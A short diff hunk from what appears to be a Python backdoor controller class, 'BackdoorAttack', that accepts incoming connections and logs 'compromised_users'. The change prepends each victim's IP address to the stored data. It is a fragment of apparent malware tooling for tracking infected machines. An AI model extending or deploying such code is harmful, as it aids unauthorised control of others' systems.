@@ -82,7 +82,7 @@ class BackdoorAttack:
 
         self.connection, self.address = listener.accept()
         
-        BackdoorAttack.compromised_users[self.address[0]] = self.receive_data()
+        BackdoorAttack.compromised_users[self.address[0]] = "IP: {} | ".format(self.address[0]) + self.receive_data()
         BackdoorAttack.compromised_sys_count += 1
 
     """ 
